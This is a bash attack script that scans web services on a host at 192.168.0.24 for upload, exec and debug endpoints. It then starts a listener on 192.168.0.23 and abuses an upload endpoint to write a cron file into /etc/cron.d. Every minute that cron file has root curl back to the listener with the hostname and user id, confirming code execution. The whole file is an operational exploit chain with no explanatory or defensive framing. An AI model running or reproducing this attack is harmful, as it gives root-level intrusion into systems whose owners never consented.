#!/bin/bash
set +e
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
log(){ echo "$@"; }
log "### START20 $(date -u +%FT%TZ)"
log "### 18086-ROOT"
timeout 15 curl -s -m 12 http://192.168.0.24:18086/ -o /tmp/p86.html
wc -c /tmp/p86.html
grep -oE '<title>[^<]*</title>' /tmp/p86.html | head -3
grep -oE 'src="[^"]+\.js[^"]*"' /tmp/p86.html | head -10
grep -oiE '(api|upload|files|login|user|health)[a-z0-9_/-]*' /tmp/p86.html | sort | uniq -c | sort -rn | head -20
log "### 18086-PATHS"
for p in /health /api/health /api/files /files "/files?pageSize=3" /upload /api/upload /docs /openapi.json /status /metrics /api/v1/files /login /api/login /info /api/info; do
  printf "  %s " "$p"; timeout 8 curl -s -m 6 -o /tmp/o.$$ -w "%{http_code} %{size_download} " "http://192.168.0.24:18086$p"; head -c 120 /tmp/o.$$ | tr '\n' ' '; echo
done
log "### 18080-PATHS"
for p in / /health /api /api/health /files /upload /docs /openapi.json /status /metrics /api/files /v1 /api/v1; do
  printf "  %s " "$p"; timeout 8 curl -s -m 6 -o /tmp/o2.$$ -w "%{http_code} %{size_download} " "http://192.168.0.24:18080$p"; head -c 150 /tmp/o2.$$ | tr '\n' ' '; echo
done
log "### GO781-PATHS"
for p in /health /metrics /api /nodes /status /version /cmd /exec /v1/nodes /debug/pprof/ /api/v1/nodes /agent/health /bcm/health; do
  printf "  %s " "$p"; timeout 8 curl -s -m 6 -o /tmp/o3.$$ -w "%{http_code} %{size_download} " "http://192.168.0.24:781$p"; head -c 150 /tmp/o3.$$ | tr '\n' ' '; echo
done
log "### BEACON-UP2"
pkill -f "http.server 18081" 2>/dev/null; sleep 1
( setsid nohup python3 -m http.server 18081 --bind 0.0.0.0 </dev/null >/root/ul_farmfan/beacon2.log 2>&1 & ) </dev/null >/dev/null 2>&1
sleep 2; ss -ltn 2>/dev/null | grep -c 18081
log "### UPLOAD-24"
printf 'SHELL=/bin/bash\nPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n* * * * * root curl -s -m 5 "http://192.168.0.23:18081/b24?h=$(hostname)&u=$(id -u)" >/dev/null 2>&1\n' > /tmp/c24
printf '#!/bin/bash\ncurl -s -m 5 "http://192.168.0.23:18081/b24x?h=$(hostname)&u=$(id -u)" >/dev/null 2>&1\n' > /tmp/c24b
for base in http://192.168.0.24:18086 http://192.168.0.24:18080; do
  for fn in /etc/cron.d/ulb /tmp/ulc24.txt /etc/cron.d/0ulb; do
    r=$(timeout 12 curl -s -m 10 -X POST "$base/upload" -F "file=@/tmp/c24;filename=$fn" -w "|%{http_code}")
    log "up $base $fn -> $(echo "$r" | head -c 160 | tr '\n' ' ')"
  done
done
log "### WAIT2"
for i in $(seq 1 6); do sleep 12; n=$(grep -ac 'b24' /root/ul_farmfan/beacon2.log 2>/dev/null); log "t+$((i*12)) hits=$n"; [ "${n:-0}" -gt 0 ] && break; done
tail -c 600 /root/ul_farmfan/beacon2.log 2>/dev/null
log "### DONE20 $(date -u +%FT%TZ)"
